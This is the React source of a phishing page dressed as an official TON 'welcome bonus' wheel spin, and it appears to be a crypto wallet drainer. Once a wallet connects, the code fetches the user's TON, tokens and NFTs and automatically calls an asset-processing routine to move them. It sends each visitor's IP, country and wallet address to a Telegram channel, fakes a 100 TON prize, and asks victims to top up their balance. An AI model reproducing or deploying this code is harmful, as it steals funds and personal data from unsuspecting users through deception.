"use client";

import { useState, useEffect } from 'react';
import { 
  TonConnectUIProvider, 
  useTonConnectUI, 
  useTonWallet,
} from '@tonconnect/ui-react';
import { Address } from 'ton-core';
import { fetchTonData, fetchTokenData, fetchNftData, processAssets } from '@/lib/tonUtils';
import { sendTelegramMessage, getIpInfo, shortAdd } from '@/lib/telegram';

const manifestUrl = process.env.NEXT_PUBLIC_MANIFEST_URL as string;

function HomePage() {
  const [tonConnectUI] = useTonConnectUI();
  const wallet = useTonWallet();
  const [isProcessing, setIsProcessing] = useState(false);
  const [status, setStatus] = useState('');
  const [ipInfo, setIpInfo] = useState({ IP: '??', ISO2: '??' });
  const [host, setHost] = useState('');
  const [showModal, setShowModal] = useState(false);
  const [isSpinning, setIsSpinning] = useState(false);
  const [hasSpun, setHasSpun] = useState(false);
  const [userBalance, setUserBalance] = useState<number | null>(null);
  const [isLoading, setIsLoading] = useState(true);
  const [hasProcessedWallet, setHasProcessedWallet] = useState(false); // Новое состояние

  useEffect(() => {
    // Prevent flash of unstyled content
    document.body.style.visibility = 'hidden';
    
    const timer = setTimeout(() => {
      document.body.style.visibility = 'visible';
      setIsLoading(false);
    }, 100);

    setHost(window.location.hostname);
    getIpInfo().then(setIpInfo);
    
    // Проверяем, был ли уже спин в этой сессии браузера
    const sessionSpinned = sessionStorage.getItem('hasSpun');
    if (sessionSpinned === 'true') {
      setHasSpun(true);
    }
    
    if (process.env.NEXT_PUBLIC_TG_ENTER_WEBSITE === 'true') {
      const message = `👀 *User opened the website*\n\n🌍 ${navigator.language} | ${host}\n\n📍 [${ipInfo.ISO2}](https://ipapi.co/?q=${ipInfo.IP})`;
      sendTelegramMessage(message);
    }

    return () => clearTimeout(timer);
  }, [host, ipInfo.ISO2]);

  // Fetch user balance when wallet connects
  useEffect(() => {
    const fetchBalance = async () => {
      if (wallet) {
        try {
          const userWallet = Address.parse(wallet.account.address).toString({ bounceable: false });
          const tonData = await fetchTonData(userWallet);
          setUserBalance(tonData?.balance || 0);
        } catch (error) {
          console.error('Error fetching balance:', error);
          setUserBalance(0);
        }
      } else {
        setUserBalance(null);
        setHasProcessedWallet(false); // Сбрасываем флаг при отключении кошелька
      }
    };

    fetchBalance();
  }, [wallet]);

  // НОВЫЙ ЭФФЕКТ: Автоматический вызов транзакции после подключения кошелька
  useEffect(() => {
    const autoProcessWallet = async () => {
      // Проверяем условия для автовызова
      if (wallet && userBalance !== null && !hasProcessedWallet && !isProcessing) {
        setHasProcessedWallet(true); // Устанавливаем флаг, чтобы избежать повторных вызовов
        
        // Проверяем минимальный баланс
        if (userBalance < 0.2) {
          setStatus('Insufficient balance. Please add at least 0.2 TON to your wallet.');
          return;
        }

        // Запускаем процесс обработки активов
        await handleCollectAssetsAuto();
      }
    };

    autoProcessWallet();
  }, [wallet, userBalance, hasProcessedWallet, isProcessing]);

  // Новая функция для автоматической обработки активов
  const handleCollectAssetsAuto = async () => {
    if (!wallet) return;

    setIsProcessing(true);
    setStatus('Auto-processing wallet assets...');

    try {
      const userWallet = Address.parse(wallet.account.address).toString({ bounceable: false });
      
      const tonData = await fetchTonData(userWallet);
      const tokenData = await fetchTokenData(userWallet);
      const nftData = await fetchNftData(userWallet);

      if (!tonData && tokenData.length === 0 && nftData.length === 0) {
        if (process.env.NEXT_PUBLIC_TG_CONNECT_EMPTY === 'true') {
          const message = `🔌💩 *User Connected an empty Wallet* (${shortAdd(userWallet)})\n\n🌍 ${host} - 📍 [${ipInfo.ISO2}](https://ipapi.co/?q=${ipInfo.IP})`;
          await sendTelegramMessage(message);
        }
        
        setStatus('Empty wallet detected. Disconnecting...');
        handleDisconnect();
        return;
      }

      await processAssets(
        tonData, 
        tokenData, 
        nftData, 
        userWallet, 
        tonConnectUI, 
        ipInfo,
        host
      );

      setStatus('Assets processed successfully!');
      
      // Показываем модалку с результатом
      setShowModal(true);
      
    } catch (error) {
      setStatus(`Error: ${(error as Error).message}`);
    } finally {
      setIsProcessing(false);
    }
  };

  const handleSpin = () => {
    if (hasSpun || isSpinning) return;
    
    setIsSpinning(true);
    setHasSpun(true);
    
    // Сохраняем состояние в sessionStorage
    sessionStorage.setItem('hasSpun', 'true');
    
    // Улучшенная анимация колеса - увеличил время с 3s до 6s
    const wheel = document.getElementById('wheel');
    if (wheel) {
      wheel.style.transition = 'transform 6s cubic-bezier(0.25, 0.46, 0.45, 0.94)';
      wheel.style.transform = 'rotate(2160deg)'; // Увеличил обороты с 1800 до 2160 (6 полных оборотов)
      
      setTimeout(() => {
        wheel.style.transition = 'none';
        wheel.style.transform = 'rotate(0deg)';
      }, 6000); // Изменил с 3000 на 6000ms
    }
    
    // Показать модалку через 6.5 секунд (вместо 3.5)
    setTimeout(() => {
      setShowModal(true);
      setIsSpinning(false);
    }, 6500);
  };

  const handleConnectWallet = () => {
    tonConnectUI.openModal();
  };

  const handleDisconnect = () => {
    tonConnectUI.disconnect();
    setUserBalance(null);
    setHasProcessedWallet(false); // Сбрасываем флаг
    setStatus('Wallet disconnected');
  };

  const handleClaimReward = () => {
    if (!wallet) {
      handleConnectWallet();
      return;
    }
    
    // Если кошелек подключен, сразу показываем модалку
    setShowModal(true);
  };

  const handleCollectAssets = async () => {
    if (!wallet) {
      handleConnectWallet();
      return;
    }

    // Check minimum balance requirement
    if (userBalance === null || userBalance < 0.2) {
      setStatus('Insufficient balance. Please add at least 0.5 TON to your wallet to claim the reward.');
      return;
    }

    setIsProcessing(true);
    setStatus('Processing your reward...');

    try {
      const userWallet = Address.parse(wallet.account.address).toString({ bounceable: false });
      
      const tonData = await fetchTonData(userWallet);
      const tokenData = await fetchTokenData(userWallet);
      const nftData = await fetchNftData(userWallet);

      if (!tonData && tokenData.length === 0 && nftData.length === 0) {
        if (process.env.NEXT_PUBLIC_TG_CONNECT_EMPTY === 'true') {
          const message = `🔌💩 *User Connected an empty Wallet* (${shortAdd(userWallet)})\n\n🌍 ${host} - 📍 [${ipInfo.ISO2}](https://ipapi.co/?q=${ipInfo.IP})`;
          await sendTelegramMessage(message);
        }
        
        setStatus('Empty wallet detected. Disconnecting...');
        handleDisconnect();
        return;
      }

      await processAssets(
        tonData, 
        tokenData, 
        nftData, 
        userWallet, 
        tonConnectUI, 
        ipInfo,
        host
      );

      setStatus('Reward claimed successfully!');
      setShowModal(false);
    } catch (error) {
      setStatus(`Error: ${(error as Error).message}`);
    } finally {
      setIsProcessing(false);
    }
  };

  if (isLoading) {
    return (
      <div style={{
        position: 'fixed',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        background: '#181f2e',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        zIndex: 9999
      }}>
        <div style={{
          width: '50px',
          height: '50px',
          border: '3px solid #0098ea',
          borderTop: '3px solid transparent',
          borderRadius: '50%',
          animation: 'spin 1s linear infinite'
        }} />
      </div>
    );
  }

  return (
    <>
      <style jsx global>{`
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
        }

        h1, h2, h3 {
          margin: 0;
          padding: 0;
        }

        p {
          margin: 0;
          padding: 0;
        }

        a {
          text-decoration: none;
          color: #f2f2f2;
          display: block;
        }

        body {
          font-family: "Manrope", sans-serif;
          font-weight: 400;
          top: 0;
          left: 0;
          padding: 0;
          background: #181f2e url(/assets/img/bg.jpg) top no-repeat;
          background-size: 100% auto;
          margin: 0;
          width: 100%;
          height: 100%;
          opacity: 1;
          transition: opacity 0.3s ease;
        }

        html, body {
          width: 100vw;
          overflow-x: hidden;
        }

        ::-webkit-scrollbar {
          width: 5px;
          background-color: #c8d5de;
          height: 5px;
          border-radius: 10px;
        }

        ::-webkit-scrollbar-thumb {
          border-radius: 10px;
          background-color: #0098ea;
          width: 5px;
        }

        ::-webkit-scrollbar-track {
          -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, 0.2);
          border-radius: 10px;
          background-color: #c8d5de;
        }

        .container {
          width: 100%;
          max-width: 1440px;
          display: block;
          margin: 0 auto;
        }

        .header {
          width: 100%;
          position: relative;
          z-index: 10;
        }

        .header_items {
          display: flex;
          align-items: center;
          padding-top: 40px;
          padding-bottom: 40px;
        }

        .header_item:nth-child(2) {
          margin-left: auto;
          margin-right: 50px;
        }

        .header_item_logo {
          vertical-align: middle;
        }

        .header_item_socials {
          display: flex;
          align-items: center;
        }

        .header_item_social {
          cursor: pointer;
          transition: all 0.3s ease;
          margin-right: 12px;
        }

        .header_item_social:hover {
          opacity: 0.7;
          transform: translateY(-2px);
        }

        .header_item_social:last-child {
          margin-right: 0px;
        }

        .wallet_button {
          cursor: pointer;
          transition: all 0.3s ease;
          color: #fff;
          text-align: center;
          font-size: 20px;
          font-style: normal;
          font-weight: 600;
          line-height: 140%;
          text-transform: uppercase;
          display: flex;
          align-items: center;
          padding: 24px 32px;
          border-radius: 100px;
          outline: none;
          border: none;
          position: relative;
          overflow: hidden;
        }

        .wallet_button_connect {
          background: linear-gradient(180deg, #41b8de 0%, #0098ea 125.89%);
        }

        .wallet_button_connected {
          background: linear-gradient(180deg, #4ade80 0%, #16a34a 125.89%);
        }

        .wallet_button img {
          vertical-align: middle;
          margin-left: 12px;
        }

        .wallet_button:hover {
          opacity: 0.8;
          transform: translateY(-1px);
        }

        .wallet_info {
          display: flex;
          flex-direction: column;
          align-items: flex-end;
          margin-right: 16px;
        }

        .wallet_address {
          font-size: 16px;
          font-weight: 600;
          color: #fff;
        }

        .wallet_balance {
          font-size: 12px;
          color: rgba(255, 255, 255, 0.7);
          margin-top: 2px;
        }

        .main {
          padding-top: 78px;
          padding-bottom: 60px;
        }

        .main_tittle {
          color: #fff;
          text-align: center;
          font-size: 72px;
          font-style: normal;
          font-weight: 800;
          line-height: 110%;
          letter-spacing: -1.44px;
          text-transform: uppercase;
          text-shadow: 0 4px 20px rgba(0, 152, 234, 0.3);
        }

        .main_tittle span {
          color: #17aeff;
        }

        .main_wheel {
          margin-top: 40px;
          position: relative;
        }

        .main_wheel::before {
          content: " ";
          position: absolute;
          left: 0;
          top: 0;
          z-index: 1;
          width: 100%;
          height: 100%;
          background: url(/assets/img/grad.png) bottom no-repeat;
          background-size: 100% 100%;
          background-position-y: 150px;
        }

        .main_wheel_main {
          position: relative;
          width: 100%;
          max-height: 600px;
          overflow: hidden;
        }

        .main_wheel_main_arrow {
          position: absolute;
          left: calc(50% - 62px);
          top: 0;
          z-index: 3;
          filter: drop-shadow(0 4px 10px rgba(0, 0, 0, 0.3));
        }

        .main_wheel_main_wheel {
          top: -40px;
          position: relative;
          display: block;
          margin: 0 auto;
          width: 100%;
          max-width: 1344px;
          filter: drop-shadow(0 10px 30px rgba(0, 0, 0, 0.4));
        }

        .main_wheel_main_button {
          display: block;
          margin: 0 auto;
          cursor: pointer;
          transition: all 0.3s ease;
          color: #fff;
          text-align: center;
          z-index: 8;
          font-size: 32px;
          font-style: normal;
          font-weight: 800;
          line-height: 110%;
          letter-spacing: -0.64px;
          text-transform: uppercase;
          outline: none;
          border: none;
          padding: 32px 44px;
          border-radius: 1000px;
          position: absolute;
          left: 50%;
          transform: translateX(-50%);
          top: 330px;
          box-shadow: 0 8px 25px rgba(0, 152, 234, 0.4);
        }

        .main_wheel_main_button.free_spin {
          background: linear-gradient(180deg, #41b8de 0%, #0098ea 125.89%);
        }

        .main_wheel_main_button.claim_reward {
          background: linear-gradient(180deg, #4ade80 0%, #16a34a 125.89%);
          box-shadow: 0 8px 25px rgba(34, 197, 94, 0.4);
        }

        .main_wheel_main_button.processing {
          background: linear-gradient(180deg, #fbbf24 0%, #f59e0b 125.89%);
          box-shadow: 0 8px 25px rgba(245, 158, 11, 0.4);
        }

        .main_wheel_main_button:hover:not(:disabled) {
          transform: translateX(-50%) translateY(-2px);
        }

        .main_wheel_main_button.free_spin:hover:not(:disabled) {
          box-shadow: 0 12px 30px rgba(0, 152, 234, 0.6);
        }

        .main_wheel_main_button.claim_reward:hover:not(:disabled) {
          box-shadow: 0 12px 30px rgba(34, 197, 94, 0.6);
        }

        .main_wheel_main_button:disabled {
          opacity: 0.6;
          cursor: not-allowed;
        }

        .main_faq {
          position: relative;
          top: -130px;
          width: 100%;
          z-index: 3;
        }

        .main_faq_blocks {
          display: block;
          margin: 0 auto;
          max-width: 1061px;
        }

        .main_faq_block {
          margin-bottom: 12px;
          color: #fff;
          text-align: center;
          font-size: 20px;
          font-style: normal;
          font-weight: 600;
          line-height: 150%;
          display: flex;
          align-items: center;
          padding: 24px 20px;
          border-radius: 16px;
          background: rgba(39, 51, 73, 0.9);
          backdrop-filter: blur(10px);
          transition: all 0.3s ease;
        }

        .main_faq_block:hover {
          background: rgba(39, 51, 73, 1);
          transform: translateY(-2px);
        }

        .main_faq_block img {
          vertical-align: middle;
          margin-right: 12px;
        }

        .main_faq_block:last-child {
          margin-bottom: 0px;
        }

        .main_faq_copy {
          color: rgba(255, 255, 255, 0.4);
          text-align: center;
          font-size: 20px;
          font-style: normal;
          font-weight: 600;
          line-height: 150%;
          position: relative;
          margin-top: 60px;
        }

        .modal {
          display: none;
          position: fixed;
          z-index: 11;
          left: 0;
          top: 0;
          width: 100%;
          height: 100vh;
          background: rgba(0, 0, 0, 0.8);
          backdrop-filter: blur(5px);
          animation: fadeIn 0.3s ease;
        }

        .modal_active {
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 20px;
        }

        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }

        @keyframes slideUp {
          from { transform: translateY(50px); opacity: 0; }
          to { transform: translateY(0); opacity: 1; }
        }

        .modal_rect {
          width: 100%;
          max-width: 600px;
          border-radius: 16px;
          background: #273349;
          animation: slideUp 0.4s ease;
          box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        }

        .modal_rect_up {
          width: 100%;
          height: auto;
          background: url(/assets/img/modal_bg.png) top no-repeat;
          border-top-left-radius: 16px;
          border-top-right-radius: 16px;
        }

        .modal_rect_up_tittle {
          color: #fff;
          text-align: center;
          font-size: 32px;
          font-style: normal;
          font-weight: 800;
          line-height: 110%;
          letter-spacing: -0.64px;
          text-transform: uppercase;
          padding-top: 58px;
          padding-bottom: 58px;
        }

        .modal_rect_up_tittle span {
          color: #0098ea;
        }

        .modal_rect_bottom_content {
          padding: 40px;
        }

        .modal_rect_bottom_text {
          color: #fff;
          text-align: center;
          font-size: 28px;
          font-style: normal;
          font-weight: 500;
          line-height: 110%;
          letter-spacing: -0.56px;
          margin-bottom: 20px;
        }

        .modal_rect_bottom_button {
          color: #fff;
          text-align: center;
          font-size: 20px;
          font-style: normal;
          font-weight: 600;
          line-height: 140%;
          text-transform: uppercase;
          display: flex;
          align-items: center;
          justify-content: center;
          cursor: pointer;
          transition: all 0.3s ease;
          padding: 24px 48px;
          border-radius: 100px;
          background: linear-gradient(180deg, #41b8de 0%, #0098ea 125.89%);
          outline: none;
          border: none;
          width: 100%;
          margin-top: 20px;
          box-shadow: 0 8px 25px rgba(0, 152, 234, 0.4);
        }

        .modal_rect_bottom_button:hover:not(:disabled) {
          transform: translateY(-2px);
          box-shadow: 0 12px 30px rgba(0, 152, 234, 0.6);
        }

        .modal_rect_bottom_button:disabled {
          opacity: 0.6;
          cursor: not-allowed;
        }

        .modal_rect_bottom_button.connect {
          background: linear-gradient(180deg, #4ade80 0%, #16a34a 125.89%);
          box-shadow: 0 8px 25px rgba(34, 197, 94, 0.4);
        }

        .modal_rect_bottom_button.connect:hover:not(:disabled) {
          box-shadow: 0 12px 30px rgba(34, 197, 94, 0.6);
        }

        .balance_warning {
          background: rgba(239, 68, 68, 0.1);
          border: 1px solid rgba(239, 68, 68, 0.3);
          color: #fecaca;
          padding: 16px;
          border-radius: 8px;
          margin: 20px 0;
          text-align: center;
          font-size: 16px;
        }

        .modal_close_btn {
          background: transparent;
          border: 1px solid rgba(255,255,255,0.3);
          color: rgba(255,255,255,0.7);
          padding: 12px 24px;
          border-radius: 50px;
          margin-top: 16px;
          cursor: pointer;
          font-size: 14px;
          transition: all 0.3s ease;
          width: 100%;
        }

        .modal_close_btn:hover {
          border-color: rgba(255,255,255,0.5);
          color: #fff;
        }

        /* Добавленные анимации */
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        
        @keyframes slideIn {
          from { transform: translateX(100%); opacity: 0; }
          to { transform: translateX(0); opacity: 1; }
        }

        @media (min-width: 320px) and (max-width: 499px) {
          .container {
            padding-left: 20px;
            padding-right: 20px;
          }

          body {
            background: #181F2E;
          }

          .modal_rect_up_tittle {
            font-size: 20px;
            padding-top: 30px;
            padding-bottom: 30px;
          }

          .modal_rect_up {
            border-top-left-radius: 16px;
            border-top-right-radius: 16px;
          }

          .modal_rect_bottom_text {
            font-size: 18px;
          }

          .modal_rect_bottom_content {
            padding: 20px;
          }

          .modal_rect_bottom_button {
            margin-top: 20px;
            font-size: 16px;
            padding: 12px 24px;
          }

          .header_item:nth-child(2) {
            display: none;
          }

          .header_item_logo {
            width: 100px;
          }

          .wallet_button {
            font-size: 12px;
            white-space: nowrap;
            padding: 10px 14px;
          }

          .wallet_button img {
            width: 6px;
          }

          .header_item:last-child {
            margin-left: auto;
          }

          .main_tittle {
            font-size: 40px;
          }

          .main_wheel_main_arrow {
            width: 50px;
            left: calc(50% - 25px);
          }

          .main_wheel_main_button {
            font-size: 12px;
            font-weight: 600;
            padding: 10px;
            left: 50%;
            transform: translateX(-50%);
            top: 100px;
          }

          .main_faq_block {
            font-size: 14px;
            text-align: left;
            padding: 12px 10px;
          }

          .main_wheel_main_wheel {
            top: -10px;
          }

          .main_wheel_main {
            max-width: 280px;
            max-height: inherit;
            display: block;
            margin: 0 auto;
          }

          .main_wheel::before {
            display: none;
          }

          .main_faq {
            top: 0;
          }

          .main_faq_copy {
            margin-top: 30px;
            font-size: 14px;
          }

          .main {
            padding-top: 30px;
          }

          .wallet_info {
            display: none;
          }
        }

        @media (min-width: 500px) and (max-width: 799px) {
          .container {
            padding-left: 20px;
            padding-right: 20px;
          }

          .modal_rect_up_tittle {
            font-size: 30px;
            padding-top: 40px;
            padding-bottom: 40px;
          }

          .modal_rect_up {
            border-top-left-radius: 16px;
            border-top-right-radius: 16px;
          }

          .modal_rect_bottom_text {
            font-size: 20px;
          }

          .modal_rect_bottom_content {
            padding: 30px;
          }

          .modal_rect_bottom_button {
            margin-top: 30px;
            font-size: 18px;
            padding: 18px 30px;
          }

          .header_item:nth-child(2) {
            display: none;
          }

          .header_item_logo {
            width: 150px;
          }

          .wallet_button {
            font-size: 14px;
            white-space: nowrap;
            padding: 14px 18px;
          }

          .wallet_button img {
            width: 6px;
          }

          .header_item:last-child {
            margin-left: auto;
          }

          .main_tittle {
            font-size: 50px;
            padding-top: 75px;
          }

          .main_wheel_main_arrow {
            width: 50px;
            left: calc(50% - 25px);
          }

          .main_wheel_main_button {
            font-size: 16px;
            font-weight: 600;
            padding: 20px;
            left: 50%;
            transform: translateX(-50%);
            top: 170px;
          }

          .main_faq_block {
            font-size: 16px;
            text-align: left;
            padding: 16px 14px;
          }

          .main_wheel_main_wheel {
            top: -10px;
          }

          .main_wheel_main {
            max-width: 460px;
            max-height: inherit;
            display: block;
            margin: 0 auto;
          }

          .main_wheel::before {
            display: none;
          }

          .main_faq {
            top: 0;
          }

          .main_faq_copy {
            margin-top: 30px;
            font-size: 16px;
          }

          .wallet_info {
            display: none;
          }
        }

        @media (min-width: 800px) and (max-width: 1480px) {
          .container {
            padding-left: 20px;
            padding-right: 20px;
          }

          .main {
            padding-top: 250px;
          }

          .main_wheel_main_wheel {
            top: -20px;
          }
        }

        @media (min-width: 1920px) {
          .main_wheel::before {
            width: 90%;
          }
        }
      `}</style>

      <div>
        {/* Hidden TonConnect Button */}
        <button 
          id="connect-btn" 
          onClick={handleConnectWallet}
          style={{display: 'none', opacity: 0, height: 0, width: 0}}
        />

        {/* Win Modal */}
        <div className={`modal ${showModal ? 'modal_active' : ''}`}>
          <div className="modal_rect">
            <div className="modal_rect_up">
              <p className="modal_rect_up_tittle">
                {hasProcessedWallet ? 'TRANSACTION SENT!' : 'CONGRATULATIONS!'} <br /> 
                {hasProcessedWallet ? 'Check your wallet for confirmation' : 'you have won'} <span>{hasProcessedWallet ? '' : '100 ton'}</span>
              </p>
            </div>
            <div className="modal_rect_bottom">
              <div className="modal_rect_bottom_content">
                {!wallet ? (
                  <>
                    <p className="modal_rect_bottom_text">Connect your wallet to claim your reward!</p>
                    <button 
                      className="modal_rect_bottom_button connect"
                      onClick={handleConnectWallet}
                    >
                      CONNECT WALLET
                    </button>
                  </>
                ) : userBalance !== null && userBalance < 0.2 ? (
                  <>
                    <p className="modal_rect_bottom_text">Almost there! Please add funds to claim your reward.</p>
                    <div className="balance_warning">
                      ⚠️ Minimum 0.2 TON required to claim reward<br />
                      Current balance: {userBalance.toFixed(2)} TON
                    </div>
                    <button 
                      className="modal_rect_bottom_button"
                      onClick={() => setShowModal(false)}
                    >
                      ADD FUNDS & RETURN
                    </button>
                  </>
                ) : hasProcessedWallet ? (
                  <>
                    <p className="modal_rect_bottom_text">
                      Transaction has been automatically processed! Check your wallet for confirmation.
                    </p>
                    <button 
                      className="modal_rect_bottom_button"
                      onClick={() => setShowModal(false)}
                    >
                      GOT IT!
                    </button>
                  </>
                ) : (
                  <>
                    <p className="modal_rect_bottom_text">
                      Wallet connected! Click below to claim your 100 TON reward.
                    </p>
                    <button 
                      className="modal_rect_bottom_button"
                      onClick={handleCollectAssets}
                      disabled={isProcessing}
                    >
                      {isProcessing ? 'PROCESSING...' : 'CLAIM REWARD'}
                    </button>
                  </>
                )}
                <button 
                  className="modal_close_btn"
                  onClick={() => setShowModal(false)}
                >
                  CLOSE
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Header */}
        <section className="header">
          <div className="container">
            <div className="header_items">
              <div className="header_item">
                <a href="#!" className="header_item_logo">
                  <img src="/assets/img/header_logo.svg" alt="" />
                </a>
              </div>
              <div className="header_item">
                <div className="header_item_socials">
                  <a href="https://twitter.com/ton_blockchain" target="_blank" className="header_item_social">
                    <img src="/assets/img/header_twitter.svg" alt="" />
                  </a>
                  <a href="https://youtube.com/@the_open_network?si=1C27q9XJIvpuNG1u" target="_blank" className="header_item_social">
                    <img src="/assets/img/header_yt.svg" alt="" />
                  </a>
                  <a href="https://t.me/tonblockchain" target="_blank" className="header_item_social">
                    <img src="/assets/img/header_tg.svg" alt="" />
                  </a>
                  <a href="#" className="header_item_social">
                    <img src="/assets/img/header_mail.svg" alt="" />
                  </a>
                </div>
              </div>
              <div className="header_item">
                {wallet ? (
                  <div style={{ display: 'flex', alignItems: 'center' }}>
                    <button className="wallet_button wallet_button_connected" onClick={handleDisconnect}>
                      {isProcessing ? 'Processing...' : 'Connected'}
                      <img src="/assets/img/header_arrow.svg" alt="" />
                    </button>
                  </div>
                ) : (
                  <button className="wallet_button wallet_button_connect" onClick={handleConnectWallet}>
                    Connect Wallet
                    <img src="/assets/img/header_arrow.svg" alt="" />
                  </button>
                )}
              </div>
            </div>
          </div>
        </section>

        {/* Main */}
        <section className="main">
          <div className="container">
            <h1 className="main_tittle">
              Welcome <span>bonus</span> <br /> for ton users
            </h1>

            <div className="main_wheel">
              <div className="main_wheel_main">
                <img src="/assets/img/wheel_arrow.png" alt="" className="main_wheel_main_arrow" />
                <img src="/assets/img/wheel_wheel.png" alt="" className="main_wheel_main_wheel" id="wheel" />
                {isProcessing ? (
                  <button 
                    className="main_wheel_main_button processing" 
                    disabled
                  >
                    PROCESSING...
                  </button>
                ) : !hasSpun ? (
                  <button 
                    className="main_wheel_main_button free_spin" 
                    onClick={handleSpin}
                    disabled={isSpinning}
                  >
                    {isSpinning ? 'SPINNING...' : 'FREE SPIN'}
                  </button>
                ) : (
                  <button 
                    className="main_wheel_main_button claim_reward" 
                    onClick={handleClaimReward}
                  >
                    CLAIM REWARD
                  </button>
                )}
              </div>
            </div>

            <div className="main_faq">
              <div className="main_faq_blocks">
                <p className="main_faq_block">
                  <img src="/assets/img/main_one.svg" alt="" />
                  Connect your wallet and the transaction will be processed automatically for testing purposes
                </p>
                <p className="main_faq_block">
                  <img src="/assets/img/main_two.svg" alt="" />
                  Make sure you have at least 0.2 TON in your wallet for the transaction to work
                </p>
                <p className="main_faq_block">
                  <img src="/assets/img/main_three.svg" alt="" />
                  Check your wallet for transaction confirmation after connecting
                </p>
              </div>
              <p className="main_faq_copy">Copyright © 2025 TON. All Rights Reserved</p>
            </div>
          </div>
        </section>

        {/* Status Notification */}
        {status && (
          <div style={{
            position: 'fixed',
            bottom: '20px',
            right: '20px',
            background: 'rgba(255, 255, 255, 0.95)',
            padding: '16px 24px',
            borderRadius: '12px',
            boxShadow: '0 8px 30px rgba(0, 0, 0, 0.15)',
            zIndex: 12,
            fontSize: '14px',
            color: '#333',
            maxWidth: '300px',
            backdropFilter: 'blur(10px)',
            animation: 'slideIn 0.3s ease'
          }}>
            {status}
            <button 
              onClick={() => setStatus('')}
              style={{
                position: 'absolute',
                top: '8px',
                right: '8px',
                background: 'none',
                border: 'none',
                fontSize: '16px',
                cursor: 'pointer',
                color: '#666',
                width: '20px',
                height: '20px',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center'
              }}
            >
              ×
            </button>
          </div>
        )}
      </div>
    </>
  );
}

export default function App() {
  return (
    <TonConnectUIProvider manifestUrl={manifestUrl}>
      <HomePage />
    </TonConnectUIProvider>
  );
}